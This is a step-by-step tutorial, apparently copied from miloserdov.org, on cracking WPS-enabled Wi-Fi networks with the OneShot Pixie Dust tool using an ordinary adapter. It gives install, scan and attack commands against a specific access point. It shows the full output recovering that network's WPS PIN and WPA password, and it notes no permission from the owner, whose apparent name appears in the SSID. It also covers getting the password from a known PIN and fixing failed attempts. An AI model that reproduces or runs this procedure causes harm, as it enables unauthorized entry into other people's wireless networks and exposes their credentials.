# How to hack with a normal adapter without monitor mode (miloserdov.org)

A use recommended me the [OneShot](https://en.kali.tools/?p=1002) tool. Its feature is that it uses Pixie Dust attack. But such programs, in fact, are already enough. The second feature of this program is that it does not need monitor mode. This means that any Wi-Fi card is suitable – even one with which you previously could not perform attacks.

  

Although any Wi-Fi adapter is suitable, it is better if it has an external antenna or you need to be not too far from the target access point.

  

OneShot is very easy to install – just download the script:

  

  

|   |   |
|---|---|
|1<br><br>2<br><br>3|git clone https://github.com/drygdryg/OneShot<br><br>cd OneShot/<br><br>sudo ./oneshot.py --help|

  

This is the current mod, a link to the original version (if you need it) you will find in the program description card: [https://en.kali.tools/?p=1002](https://en.kali.tools/?p=1002)

  

## How to find Wi-Fi networks with WPS support

To run the attack against the Wi-Fi Access Point, you need to know its BSSID, that is, its [MAC address](https://miloserdov.org/?p=298). BSSIDs of access points can be viewed, for example, with [Airodump-ng](https://en.kali.tools/?p=367). This program requires monitor mode. But let's proceed from the fact that we have a regular Wi-Fi adapter that does not support monitor mode.

  

There is a way out of this situation – the BSSID is distributed in ordinary frames (beacons) and the operating system always sees the BSSID of each Access Point in the access range (although it usually does not show this information, since most users do not need it).

  

Before we start, let's stop NetworkManager, because it will constantly interfere with us:

  

  

|   |   |
|---|---|
|1|systemctl stop NetworkManager|

  

In order for the operating system to scan Access Points within reach and show us information on them, run the following command:

  

  

|   |   |
|---|---|
|1|iw dev INTERFACE scan|

  

Where instead of **INTERFACE** you need to insert the actual name of your wireless interface. On Kali Linux, this is usually wlan0 and the command looks like this:

  

  

|   |   |
|---|---|
|1|iw dev wlan0 scan|

  

If you do not know the interface name on your system, then run the command:

  

  

|   |   |
|---|---|
|1|iw dev|

  

The following will be displayed:

  

  

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7|phy#0<br><br>    Interface wlan0<br><br>        ifindex 3<br><br>        wdev 0x1<br><br>        addr 7e:ef:a8:b2:43:60<br><br>        type managed<br><br>        txpower 20.00 dBm|

  

A string, that starts on **Interface**, contains the name of the interface.

  

After scanning, most likely, the information will be VERY much, scroll through and look for those APs which has a WPS field, for example:

  

  

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12|WPS:     * Version: 1.0<br><br>     * Wi-Fi Protected Setup State: 2 (Configured)<br><br>     * Response Type: 3 (AP)<br><br>     * UUID: 0be8e40b-92b5-23fc-a1ca-72fbf138036f<br><br>     * Manufacturer: TC7200<br><br>     * Model: TC7200<br><br>     * Model Number: 123456<br><br>     * Serial Number: 0000001<br><br>     * Primary Device Type: 6-0050f204-1<br><br>     * Device name: TechnicolorAP<br><br>     * Config methods: Display<br><br>     * RF Bands: 0x1|

![[Pasted image 20231028141837.png]]

This is suitable, I scroll up a bit to see the BSSID of this access point:

  

  

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13|BSS b0:c2:87:4b:e0:fd(on wlan0)<br><br>    TSF: 125911554303 usec (1d, 10:58:31)<br><br>    freq: 2412<br><br>    beacon interval: 100 TUs<br><br>    capability: ESS Privacy ShortSlotTime RadioMeasure (0x1411)<br><br>    signal: -67.00 dBm<br><br>    last seen: 9352 ms ago<br><br>    Information elements from Probe Response frame:<br><br>    SSID: Mr.yongyut Daengluead 2G<br><br>    Supported rates: 1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0<br><br>    DS Parameter set: channel 1<br><br>    ERP: Barker_Preamble_Mode<br><br>    ERP D4.0: Barker_Preamble_Mode|

![[Pasted image 20231028141912.png]]

In this list, the **BSSID** is called **BSS** and for this Access Point the value is **b0:c2:87:4b:e0:fd**. We don’t need any more information, but note that the signal strength is good, and the name of this access point is Mr.yongyut Daengluead 2G:

  

  

|   |   |
|---|---|
|1<br><br>2|signal: -67.00 dBm<br><br>SSID: Mr.yongyut Daengluead 2G|

  

## Pixie Dust Attack

Now you need to run a command of the form:

  

  

|   |   |
|---|---|
|1|python3 oneshot.py -i wlan0 -b BSSID -K|

  

In this command, the **BSSID** must be replaced with a valid value for the access point of interest. For example:

  

  

|   |   |
|---|---|
|1|python3 oneshot.py -i wlan0 -b b0:c2:87:4b:e0:fd -K|

  

Output:

  

  

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14<br><br>15<br><br>16<br><br>17<br><br>18<br><br>19<br><br>20<br><br>21<br><br>22<br><br>23<br><br>24<br><br>25<br><br>26|[*] Running wpa_supplicant...<br><br>[*] Trying PIN "12345670"...<br><br>[*] Scanning...<br><br>[*] Authenticating...<br><br>[+] Authenticated<br><br>[*] Associating with AP...<br><br>[+] Associated with B0:C2:87:4B:E0:FD (ESSID: Mr.yongyut Daengluead 2G)<br><br>[*] Sending EAPOL Start...<br><br>[*] Received Identity Request<br><br>[*] Sending Identity Response...<br><br>[*] Received WPS Message M1<br><br>[P] E-Nonce: 460029BB72C930E71309524CB331A25D<br><br>[*] Sending WPS Message M2...<br><br>[P] PKR: 53E94D34306AA115199C7F1DDBA2CC7572F60D64A9EF6F6A6211416CDA2EB679C00BF9297D00895FFE412AD90BE5A33D902EF9200229E5A88C63892B3FC9366B110EF71853E5F93037036041A1DACFFC3CAB59ACB12A9D9EF8DB47F2F0F5C98C95830CBD7689C18B34B1A839C1C5975E99CDC507594D76C0F5CE1CEC85207478A16B50F05E4E5F20CB804B1E58D734939F736EF899AE4C9CFE818A72DCA72E19845737E3765B23C4A0F746F6876DECF3680EFAD08FEE156B152F56A572151A72<br><br>[P] PKE: CADFCC3F2D87D4EFBAF35A7541C50D966BAC20BD3FB204AC8883F8B77E8F557F2F2D2D796E13FC3DA98BDAEFC5C76CFDD90283E715988C7C61A0456632E436705C8978A1F210533A1FF70BEE8F1BF0026037C5922DC4E2A7E99AC4AFD679A627809DA03362BC674E0200E78E0F686F7C77B17A02C502F87FF697F35D8BCDA364B515CD3DB37B17F84BDA76C1E8C63C3DC23F7E306701AB201F85D701DFF1D3102D59A6BDF6A4153D6C40EC2690E1178639BE85314DC7C0EC39AA0885455D4D4C<br><br>[P] AuthKey: DD5238440D336186241B11838D46970E9DA9E9715CF4221374875F09310F8EC6<br><br>[*] Received WPS Message M3<br><br>[P] E-Hash1: 2D7CD407438467EE2C14FD9F58A8E81CCD7AADA2D6913DF5B43F059B55C417ED<br><br>[P] E-Hash2: 164CA34B538C84ED15C676B09D84CCE2347EF4944D2F51086CEA7F517707F423<br><br>[*] Sending WPS Message M4...<br><br>[*] Received WPS Message M5<br><br>[*] Sending WPS Message M6...<br><br>[*] Received WPS Message M7<br><br>[+] WPS PIN: '12345670'<br><br>[+] WPA PSK: '0619560772'<br><br>[+] AP SSID: 'Mr.yongyut Daengluead 2G'|

![[Pasted image 20231028142039.png]]

The PIN is in the WPS PIN line, the Wi-Fi password in the WPA PSK line, and the access point name in the AP SSID line:

  

  

|   |   |
|---|---|
|1<br><br>2<br><br>3|[+] WPS PIN: '12345670'<br><br>[+] WPA PSK: '0619560772'<br><br>[+] AP SSID: 'Mr.yongyut Daengluead 2G'|

  

That is, this Wi-Fi AP did not pass a security wireless audit…

  

In case of failure on our side, output will look like:

  

  

|   |   |
|---|---|
|1<br><br>2|[-] WPS-FAIL error<br><br>[!] No enough data to run Pixie Dust attack|

  

## Integrated WPS networks scan

After the upgrade, OneShot received a built-in scanner to search for wireless networks with WPS support. Now if you run the program without the **--bssid** option,

  

  

|   |   |
|---|---|
|1|./oneshot.py -i wlp0s20f0u1 -K|

  

then it will start by scanning to find Wi-Fi with WPS:
![[Pasted image 20231028142132.png]]

A list of networks will be displayed and you just need to specify the number of the target AP to perform the attack against it.

  

APs in which WPS is blocked are marked in red.

  

Green indicates APs with a high probability of vulnerability to Pixie Dust attack.

  

Unmarked APs may also be vulnerable.

  

## Getting a Wi-Fi network password when a WPS PIN is known

OneShot can also be used to obtain a PSK key (in other words, a Wi-Fi password) when the WPS PIN is already known.

  

To do this, you need to run the program with the **-p** option, after which you need to specify the PIN code. The **-K** option is not necessary. Command example:

  

  

|   |   |
|---|---|
|1|sudo ./oneshot.py -i wlp0s20f0u1 -b CC:4E:EC:4E:B3:18 -p 96101019|

  

## Error ‘Unexpected interference — kill NetworkManager/wpa_supplicant!’

When attacking some Access Points, an error occurs:

  

|   |   |
|---|---|
|1|[!] Unexpected interference — kill NetworkManager/wpa_supplicant!|

  

The essence of the message is that the wireless interface experiences an unforeseen influence, which may be associated, first of all, with the operation of the NetworkManager and wpa_supplicant programs. Therefore, first of all, try to stop these programs:

  

|   |   |
|---|---|
|1<br><br>2|sudo systemctl stop NetworkManager<br><br>sudo airmon-ng check kill|

  

This will not necessarily fix the error. It feels like it occurs when something goes “not according to plan”, for example, it is not possible to receive the next M* message due to the target AP being too far away and the signal is unstable. That is, the cause may be not only NetworkManager or wpa_supplicant, but also a bad signal.

  

For example, I ran the command several times in a row and received the same message about Unexpected interference:
![[Pasted image 20231028142208.png]]

Then I took a more sensitive Wi-Fi adapter and moved it closer to the AP – and everything went well:
![[Pasted image 20231028142248.png]]

WPS attacks are quite sensitive to signal quality. You should try using other Wi-Fi adapters, large or directional antennas, or approach the target Access Point closer.

  

## Conclusion

When you play enough, then for NetworkManager to work again (and the Internet connection will return), run the command:

  

  

|   |   |
|---|---|
|1|systemctl start NetworkManager|

  

So, [OneShot](https://en.kali.tools/?p=1002) proved to be excellent – I got a positive result right away, the first time I launched it.

  

It should be noted that the command

  

  

|   |   |
|---|---|
|1|iw dev wlan0 scan|

  

is insensitive. That is, it will show only Access Points in a confident accessibility range. On the one hand, this is good, since you will not waste time on Access Points, which although are visible, but because of the weakness of the signal, it is impossible to do anything with them – just lose time with them. But on the other hand, you may miss something interesting. Therefore, if desired, additional APs with WPS enabled can also be collected using [Airodump-ng](https://en.kali.tools/?p=367).

  

The same “trick” (using Pixie Dust attack with an adapter without monitor mode) is able to perform the [Router Scan](https://miloserdov.org/?goto=28429) program in Windows. See the article “[How to hack Wi-Fi in Windows](https://miloserdov.org/?p=712)” for details.